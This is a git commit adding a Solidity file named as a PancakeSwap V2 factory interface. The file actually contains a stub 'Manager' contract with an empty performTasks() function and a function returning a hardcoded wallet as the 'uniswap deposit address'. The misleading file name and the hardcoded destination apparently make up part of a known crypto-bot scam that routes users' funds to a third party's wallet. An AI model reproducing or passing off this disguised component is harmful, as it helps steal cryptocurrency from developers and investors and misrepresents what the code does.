5f2b312b389adcab839ccd8beb9f1a20357e528e
SmartContractDevs <96862824+SmartContractDevs@users.noreply.github.com>
2021-12-30 08:54:12 +0100

    Add files via upload

---
+++ contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xcB5452Be261a148e1Dbe1aF4cF124D9D2F6abb20;
+	}
+}
